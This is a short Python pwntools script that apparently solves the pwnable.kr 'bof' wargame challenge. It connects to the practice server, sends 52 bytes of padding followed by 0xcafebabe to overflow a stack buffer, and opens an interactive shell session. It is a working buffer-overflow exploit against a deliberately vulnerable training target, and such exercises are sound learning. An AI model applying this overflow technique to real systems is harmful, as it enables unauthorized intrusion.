#!/usr/bin/python

from pwn import *

# nc remote
p = remote('pwnable.kr',9000)

# payload = padding + 0xcafebabe
payload = 'A' * 52 + '\xbe\xba\xfe\xca'

# send payload
p.send(payload)
#interactive
p.interactive()
